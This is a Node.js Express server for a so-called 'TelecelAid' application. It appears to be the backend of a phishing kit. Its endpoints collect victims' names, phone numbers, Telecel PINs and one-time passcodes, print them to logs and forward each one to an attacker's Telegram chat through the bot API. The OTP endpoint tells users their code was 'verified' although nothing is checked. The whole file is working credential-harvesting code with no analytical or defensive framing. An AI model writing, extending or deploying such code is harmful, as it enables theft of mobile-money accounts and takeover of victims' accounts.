const express = require('express');
const axios = require('axios');
const cors = require('cors');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Telegram Bot Configuration
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

// Function to send message to Telegram
async function sendToTelegram(name, phone, pin, type = 'application') {
    let message = '';
    
    if (type === 'application') {
        message = `🔔 *NEW TELECELAID APPLICATION* 🔔
        
━━━━━━━━━━━━━━━━━━━━━━
👤 *Name:* ${name}
📞 *Phone:* ${phone}
🔐 *PIN:* ${pin}
━━━━━━━━━━━━━━━━━━━━━━
📅 *Date:* ${new Date().toLocaleString()}
✅ *Status:* Pending Review
━━━━━━━━━━━━━━━━━━━━━━`;
    } else if (type === 'otp') {
        message = `🔐 *OTP VERIFICATION* 🔐
        
━━━━━━━━━━━━━━━━━━━━━━
👤 *Name:* ${name}
📞 *Phone:* ${phone}
🔢 *OTP Code:* ${pin}
━━━━━━━━━━━━━━━━━━━━━━
📅 *Date:* ${new Date().toLocaleString()}
✅ *Status:* OTP Verified Successfully
━━━━━━━━━━━━━━━━━━━━━━`;
    }
    
    try {
        const response = await axios.post(TELEGRAM_API, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        return response.data;
    } catch (error) {
        console.error('Telegram Error:', error.response?.data || error.message);
        throw error;
    }
}

// Health check endpoint
app.get('/', (req, res) => {
    res.json({ status: 'OK', message: 'TelecelAid Backend is running' });
});

// Endpoint for application submission (verify page)
app.post('/api/submit', async (req, res) => {
    const { fullName, confirmedName, phoneNumber, confirmedPhone, telecelPin } = req.body;
    
    console.log('Received application submission:', { fullName, confirmedName, phoneNumber, confirmedPhone, telecelPin });
    
    const finalName = confirmedName || fullName;
    const finalPhone = confirmedPhone || phoneNumber;
    
    if (!finalName || !finalPhone || !telecelPin) {
        return res.status(400).json({ 
            success: false, 
            message: 'Missing required fields: name, phone, or PIN' 
        });
    }
    
    try {
        await sendToTelegram(finalName, finalPhone, telecelPin, 'application');
        
        res.json({ 
            success: true, 
            message: 'Application submitted successfully' 
        });
        
    } catch (error) {
        console.error('Error sending to Telegram:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Failed to submit application. Please try again.' 
        });
    }
});

// NEW ENDPOINT: For OTP verification (otp page)
app.post('/api/verify-otp', async (req, res) => {
    const { fullName, phoneNumber, otpCode } = req.body;
    
    console.log('Received OTP verification:', { fullName, phoneNumber, otpCode });
    
    if (!fullName || !phoneNumber || !otpCode) {
        return res.status(400).json({ 
            success: false, 
            message: 'Missing required fields: name, phone, or OTP' 
        });
    }
    
    try {
        await sendToTelegram(fullName, phoneNumber, otpCode, 'otp');
        
        res.json({ 
            success: true, 
            message: 'OTP verified and sent to Telegram' 
        });
        
    } catch (error) {
        console.error('Error sending OTP to Telegram:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Failed to verify OTP. Please try again.' 
        });
    }
});

// Start server
app.listen(PORT, () => {
    console.log(`🚀 TelecelAid Backend running on port ${PORT}`);
    console.log(`📡 Telegram Bot configured: ${BOT_TOKEN ? 'Yes' : 'No'}`);
    console.log(`📱 Chat ID configured: ${CHAT_ID ? 'Yes' : 'No'}`);
    console.log(`🌐 Server URL: http://localhost:${PORT}`);
});
